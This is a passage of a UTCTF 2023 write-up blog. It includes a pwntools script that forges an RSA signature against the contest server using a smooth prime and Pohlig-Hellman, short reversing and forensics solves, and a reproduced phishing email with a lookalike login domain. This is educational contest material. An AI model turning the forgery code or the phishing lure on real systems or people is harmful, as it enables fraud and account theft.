</span></span><span style=display:flex><span>    alice <span style=color:#f92672>=</span> rsa<span style=color:#f92672>.</span>generate_private_key(public_exponent<span style=color:#f92672>=</span><span style=color:#ae81ff>65537</span>, key_size<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Alice&#39;s pk: &#34;</span>, alice<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>public_numbers()<span style=color:#f92672>.</span>n, alice<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>public_numbers()<span style=color:#f92672>.</span>e)
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> randbits(<span style=color:#ae81ff>256</span>)
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> pow(m, alice<span style=color:#f92672>.</span>private_numbers()<span style=color:#f92672>.</span>d, alice<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>public_numbers()<span style=color:#f92672>.</span>n)
</span></span><span style=display:flex><span>    print(m, s)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Your key: &#34;</span>)
</span></span><span style=display:flex><span>    n_prime <span style=color:#f92672>=</span> abs(int(input(<span style=color:#e6db74>&#34;n&#39;: &#34;</span>)))
</span></span><span style=display:flex><span>    e_prime <span style=color:#f92672>=</span> abs(int(input(<span style=color:#e6db74>&#34;e&#39;: &#34;</span>)))
</span></span><span style=display:flex><span>    d_prime <span style=color:#f92672>=</span> abs(int(input(<span style=color:#e6db74>&#34;d&#39;: &#34;</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Checks</span>
</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> randbits(<span style=color:#ae81ff>256</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> alice<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>public_numbers()<span style=color:#f92672>.</span>n <span style=color:#f92672>!=</span> n_prime <span style=color:#f92672>or</span> alice<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>public_numbers()<span style=color:#f92672>.</span>e <span style=color:#f92672>!=</span> e_prime
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> n_prime <span style=color:#f92672>&gt;</span> s
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> pow(x, e_prime <span style=color:#f92672>*</span> d_prime, n_prime) <span style=color:#f92672>==</span> x
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> e_prime <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> pow(s, e_prime, n_prime) <span style=color:#f92672>==</span> m
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;flag.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Flag: &#34;</span> <span style=color:#f92672>+</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip())
</span></span></code></pre></div><p>All we need to do is generate <code>n'</code> such that we can solve a discrete log easily on <code>s</code> and <code>m</code>. I made a mistake and assumed large composite numbers wouldn&rsquo;t work because
the inverse didn&rsquo;t exist, but all you had to do was try multiple times.</p><p>My final solution ended up being generating a smooth prime and doing dlog that way.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gen_smooth_prime</span>(s):
</span></span><span style=display:flex><span>    small_primes <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    t <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(small_primes) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1000</span>:
</span></span><span style=display:flex><span>        small_primes<span style=color:#f92672>.</span>append(t)
</span></span><span style=display:flex><span>        t <span style=color:#f92672>=</span> next_prime(t)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        chosen <span style=color:#f92672>=</span> random<span style=color:#f92672>.</span>sample(small_primes, <span style=color:#ae81ff>100</span>)
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> product(chosen)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> p <span style=color:#f92672>&lt;</span> s:
</span></span><span style=display:flex><span>            np <span style=color:#f92672>=</span> random<span style=color:#f92672>.</span>choice(small_primes)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> np <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> chosen:
</span></span><span style=display:flex><span>                chosen<span style=color:#f92672>.</span>append(np)
</span></span><span style=display:flex><span>                p <span style=color:#f92672>*=</span> np
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> is_prime(p <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> p <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> tqdm
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pohlig_hellman</span>(prime, base, target):
</span></span><span style=display:flex><span>    factors <span style=color:#f92672>=</span> factor(prime <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    print(factors)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Xs <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    Ps <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> f, e <span style=color:#f92672>in</span> tqdm(factors):
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(f, e)</span>
</span></span><span style=display:flex><span>        sub_prime <span style=color:#f92672>=</span> (prime <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>//</span> f
</span></span><span style=display:flex><span>        sub_base <span style=color:#f92672>=</span> pow(base, sub_prime, prime)
</span></span><span style=display:flex><span>        sub_target <span style=color:#f92672>=</span> pow(target, sub_prime, prime)
</span></span><span style=display:flex><span>        sub_x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> sub_x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, f):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> pow(sub_base, sub_x, prime) <span style=color:#f92672>==</span> sub_target:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># assert pow(sub_base, sub_x, prime) == sub_target</span>
</span></span><span style=display:flex><span>        Xs<span style=color:#f92672>.</span>append(sub_x)
</span></span><span style=display:flex><span>        Ps<span style=color:#f92672>.</span>append(f)
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(f, sub_x, len(Xs),  len(factors))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> crt(Xs, Ps)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#75715e># nc puffer.utctf.live 52548</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;puffer.utctf.live&#39;</span>, int(<span style=color:#ae81ff>52548</span>))
</span></span><span style=display:flex><span>line <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)
</span></span><span style=display:flex><span>N <span style=color:#f92672>=</span> int(line[<span style=color:#ae81ff>3</span>])
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> int(line[<span style=color:#ae81ff>4</span>])
</span></span><span style=display:flex><span>line <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> int(line[<span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> int(line[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;N=</span><span style=color:#e6db74>{</span>N<span style=color:#e6db74>}</span><span style=color:#e6db74>, e=</span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>, m=</span><span style=color:#e6db74>{</span>m<span style=color:#e6db74>}</span><span style=color:#e6db74>, s=</span><span style=color:#e6db74>{</span>s<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>np <span style=color:#f92672>=</span> gen_smooth_prime(N)
</span></span><span style=display:flex><span>print(np)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;np=</span><span style=color:#e6db74>{</span>np<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>s=</span><span style=color:#e6db74>{</span>s<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>m=</span><span style=color:#e6db74>{</span>m<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>ep <span style=color:#f92672>=</span> pohlig_hellman(np, s, m)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;ep=</span><span style=color:#e6db74>{</span>ep<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>assert</span> pow(s, ep, np) <span style=color:#f92672>==</span> m
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dp <span style=color:#f92672>=</span> inverse_mod(ep, euler_phi(np))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;dp=</span><span style=color:#e6db74>{</span>dp<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(str(np))
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(str(ep))
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(str(dp))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive() 
</span></span></code></pre></div><p><code>utflag{hey_wait_signature_forgery_is_illegal}</code></p><p><a href=#toc>Back to TOC</a></p><h2 id=reversing>Reversing</h2><h3 id=reading-list>Reading List</h3><p><strong>Points: 100</strong></p><blockquote><p>I created this binary to keep track of some strings that I want to read. I thought I put a CTF flag in it so I&rsquo;ll remember to make a problem for UTCTF, but I can&rsquo;t seem to find it&mldr;</p><p>By Caleb (@eden.caleb.a#6541 on Discord)</p><p><a href=files/rev/readingList>readingList</a></p></blockquote><p>Very simple strings challenge</p><pre tabindex=0><code class=language-terminal data-lang=terminal>$ strings readingList | grep &#34;utflag&#34;
utflag{string_theory_is_a_cosmological_theory_based_on_the_existence_of_cosmic_strings}
</code></pre><p><a href=#toc>Back to TOC</a></p><h3 id=game>Game</h3><p><strong>Points: 930</strong></p><blockquote><p>Nostalgic overload, at least for me. Credit due to Carolina.</p><p>By Jeriah (@jyu on Discord)</p><p><a href=files/rev/game>game</a></p></blockquote><p>The given game is actually a <code>.swf</code> file, so let&rsquo;s throw it into a decompiler like JPEXS.</p><p>Inside the file, we can search for the flag via the flag format and find it pretty easily.</p><p><img src=/img/writeups/2023/UTCTF/jpexs_search.png alt="searching for flag"></p><p><img src=/img/writeups/2023/UTCTF/jpexs_found.png alt="flag found"></p><p><code>utflag{they_kn0w}</code></p><p><a href=#toc>Back to TOC</a></p><h3 id=looks-correct-to-me>Looks Correct to Me</h3><p><strong>Points: 984</strong></p><blockquote><p>the flag checker looks right to me</p><p>oh I guess it doesn&rsquo;t terminate if your flag is right</p><p>By oops (@oops on discord)</p><p><a href=files/rev/check>check</a></p></blockquote><p>Not going to go into the decompilation and analysis, but essentially the program just checks pairs of random indices in the flag to see if they match
some values inside a giant matrix with some conditions.</p><p>If the pair of indices ever fails to satisfy the conditions, the program will exit. Otherwise, it will continue forever, proving the description.</p><p>Here&rsquo;s the solve with the extracted memory: <a href=files/rev/data>data</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>data <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;data&#34;</span>, <span style=color:#e6db74>&#34;rb&#34;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>nums <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(data), <span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>    nums<span style=color:#f92672>.</span>append(int<span style=color:#f92672>.</span>from_bytes(data[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>], <span style=color:#e6db74>&#34;little&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;u&#39;</span>
</span></span><span style=display:flex><span>known <span style=color:#f92672>=</span> <span style=color:#ae81ff>117</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>LENGTH <span style=color:#f92672>=</span> <span style=color:#ae81ff>49</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, LENGTH):
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> nums[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>128</span>): <span style=color:#75715e># searching possible ascii values</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (x <span style=color:#f92672>^</span> n <span style=color:#f92672>^</span> known) <span style=color:#f92672>%</span> x <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> (x <span style=color:#f92672>^</span> n <span style=color:#f92672>^</span> known) <span style=color:#f92672>%</span> known <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> chr(x)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><p><code>utflag{L0c4l1z3d_Ch1ck3n_M0d1f1c4t10N_g8h91b3h89}</code></p><p><a href=#toc>Back to TOC</a></p><h2 id=forensics>Forensics</h2><p>Wooo redacted text woooo</p><h3 id=easy-volatility>&ldquo;Easy&rdquo; Volatility</h3><p><strong>Points: 834</strong></p><blockquote><p>I&rsquo;ve included the flag in as shell command. Can you retrieve it?</p><p>I recommend using the volatility3 software for this challenge.</p><p>Here is the memory dump: (debian11.core.zst)[https://utexas.box.com/s/fehluzyox4bbgfjlz061r2k7k2sek3cw]
This problem also comes with a free profile! (debian11_5.10.0-21.json.zst)[https://utexas.box.com/s/g64kezqvkqhm6nw79oovcekn9z1w66q0]
Both of these files are compressed using zstd.</p><p>This challenge&rsquo;s flag looks like a UUID.</p><blockquote><p>Note: the volatility challenges do not have a flag format to discourage grepping. They all should be possible without guessing. If you have trouble, remember that you can ask for help.</p></blockquote><p>By Daniel Parks (@danielp on discord)</p></blockquote><p>This really is an easy challenge, all we need to do is expand the memory dump and profile, import the profile into volatility3, and finally run the <code>linux.bash.Bash</code> plugin</p><pre tabindex=0><code class=language-terminal data-lang=terminal>$ python3 volatility3/vol.py -f debian11.core linux.bash.Bash
Volatility 3 Framework 2.4.2
Progress:  100.00               Stacking attempts finished
PID     Process CommandTime     Command

467     bash    2023-03-05 18:21:23.000000      # 08ffea76-b232-4768-a815-3cc1c467e813
</code></pre><p><code>08ffea76-b232-4768-a815-3cc1c467e813</code> (no flag format for these)</p><p><a href=#toc>Back to TOC</a></p><h3 id=what-time-is-it>What Time is It?</h3><p><strong>Points: 905</strong></p><blockquote><p>Super Secure Company&rsquo;s database was recently breached. One of the employees self reported a potential phishing event that could be related. Unfortunately, our Linux email server does not report receiving any emails on March 2, 2023. Can you identify when this email was actually sent? The flag format is <code>utflag{MM/DD/YYYY-HH:MM}</code> in UTC time.</p><p>By Aadhithya (@aadhi0319 on Discord)</p><p><a href=files/wtit/phishing.eml>phishing.eml</a></p></blockquote><p>Looking at the email, nothing seems too out of place:</p><pre tabindex=0><code>MIME-Version: 1.0
Date: Thu, 2 Mar 2023 03:12:42 +0000
Message-ID: &lt;CAODBzaAPrwTP=oDe6fkOv1a7LApXzv1m+YrYG9RHZM7tbBJRbw@mail.gmail.com&gt;
Subject: Critical Security Incident - Action Required ASAP!
From:  Security Division &lt;admin-notifications@supersecurecompany.com&gt;
To: Jim Browning &lt;jim.browning@supersecurecompany.com&gt;
Content-Type: multipart/alternative; boundary=&#34;00000000000093882205f60cdcdb&#34;

--00000000000093882205f60cdcdb
Content-Type: text/plain; charset=&#34;UTF-8&#34;

Jim,

We have reason to believe that your Google account may have been
compromised. Please login as soon as possible at the following link in
order to secure your account. Thank you for your cooperation and swift
action to address this issue. Please feel free to reply to this email if
you have any questions. Do not email IT about this email as they are not in
the loop on account authorization issues.

https://supersecurecompany.gooogle.com/login/

Sincerely,
Security Division
Super Secure Company

--00000000000093882205f60cdcdb
Content-Type: text/html; charset=&#34;UTF-8&#34;
Content-Transfer-Encoding: quoted-printable

&lt;div dir=3D&#34;ltr&#34;&gt;&lt;div dir=3D&#34;ltr&#34;&gt;&lt;div dir=3D&#34;ltr&#34;&gt;&lt;div dir=3D&#34;ltr&#34;&gt;&lt;div di=
r=3D&#34;ltr&#34;&gt;&lt;div dir=3D&#34;ltr&#34;&gt;&lt;div dir=3D&#34;ltr&#34;&gt;&lt;div&gt;Jim,&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;=
div&gt;We have reason to believe that your=20
Google account may have been compromised. Please login as soon as=20
possible at the following link in order to secure your account. Thank=20
you for your cooperation and swift action to address this issue. Please=20
feel free to reply to this email if you have any questions. Do not email
 IT about this email as they are not in the loop on account=20
authorization issues.&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;a href=3D&#34;https://supersecu=
recompany.gooogle.com/login/&#34;&gt;https://supersecurecompany.gooogle.com/login/=
&lt;/a&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;Sincerely,&lt;/div&gt;&lt;div&gt;Security Division&lt;/d=
iv&gt;&lt;div&gt;Super Secure Company&lt;br&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;=
/div&gt;

--00000000000093882205f60cdcdb--
</code></pre><p>However, something special about Gmail boundaries is that they actually contain timestamps, so all we need to do is extract them.</p><p>If you want more information, read <a href=https://www.metaspike.com/gmail-mime-boundary-delimiter-timestamps/>here</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>boundary <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;00000000000093882205f60cdcdb&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ts <span style=color:#f92672>=</span> int(boundary[<span style=color:#ae81ff>18</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>+</span> boundary[<span style=color:#ae81ff>12</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>10</span>], <span style=color:#ae81ff>16</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>1000000</span>
</span></span><span style=display:flex><span><span style=color:#75715e># utflag{MM/DD/YYYY-HH:MM}</span>
</span></span><span style=display:flex><span>print(datetime<span style=color:#f92672>.</span>utcfromtimestamp(ts)<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#39;%m/</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>/%Y-%H:%M&#39;</span>))
</span></span></code></pre></div><p><code>utflag{03/04/2023-06:06}</code></p><p><a href=#toc>Back to TOC</a></p><h3 id=redacted-text>Redacted Text</h3><p><strong>Points: 1000</strong></p><blockquote><p>Note: there are two accepted flags for Redacted Text, of which you only need to find one.</p><p>Well, I recently found out that people actually put in the effort to reverse engineer blured text&mldr; Want to try it?</p><p>This now has three versions, in order of decreasing difficulty:</p><ul><li>redacted.png (the original)</li><li>redacted-no-subpixel-aa.png (disabled subpixel anti-aliasing, changed font size)</li><li>redacted-aligned.png (integer pixel aligned text, alternate flag)</li></ul><p>By Alex (@Alex_ on discord)</p><p>(I only solved for one so I&rsquo;m only including the download for this image)
<a href=files/redacted/redacted-aligned.png>redacted-aligned.png</a></p></blockquote><p>I&rsquo;m preparing to write a full writeup for this challenge <a href=redacted-text.md>here</a>
so this will stay empty for now. Click that link to read the full thing when it comes out.</p><p><a href=#toc>Back to TOC</a></p><h2 id=end>END</h2></div></div></main></div><script>function handle_open(e){let t=e.target;e.target.tagName==="SUMMARY"&&(t=e.target.querySelector(".code-summary-inner")),t.classList.toggle("open"),t.classList.contains("open")?t.textContent="Click to collapse "+t.textContent.split(" ").slice(3).join(" "):t.textContent="Click to expand "+t.textContent.split(" ").slice(3).join(" ")}let code_divs=document.querySelectorAll("div.highlight"),to_remove=[];for(let e of code_divs){let t="",n=e.previousElementSibling;n.tagName=="P"&&(n=n.textContent,n.startsWith("filename")&&(t=n.split("=")[1].trim(),to_remove.push(e.previousElementSibling)));let s=e.querySelector("pre code"),o=s.textContent.split(`
`).length;if(t!==""||o>10){let n=document.createElement("details"),o=document.createElement("summary"),i=document.createElement("span");i.textContent="Click to expand",t!==""&&(i.textContent+=" "+t,n.setAttribute("id",t)),i.classList.add("code-summary-inner"),o.appendChild(i),o.addEventListener("click",handle_open),o.classList.add("code-summary"),s.classList.add("code-inner"),e.parentNode.insertBefore(n,e),n.appendChild(o),n.appendChild(e),n.classList.add("code-wrapper")}}for(let e of to_remove)e.remove();let anchors=document.querySelectorAll(".postWrapper a");for(let e of anchors)e.host!==window.location.host&&(e.setAttribute("target","_blank"),e.setAttribute("rel","noopener noreferrer"));let headers=document.querySelectorAll(".postWrapper div h1, .postWrapper div h2, .postWrapper div h3, .postWrapper div h4, .postWrappe div h5, .postWrapper div h6");for(let t of headers){let n=t.getAttribute("id"),e=document.createElement("a");e.setAttribute("href","#"+n),e.classList.add("header-link"),e.textContent="#",t.append(e)}</script><footer class=footer>Â© 2023 flocto, Built with
<a href=https://gohugo.io class=footerLink>Hugo</a> and (an edited)
<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</footer></div></body></html>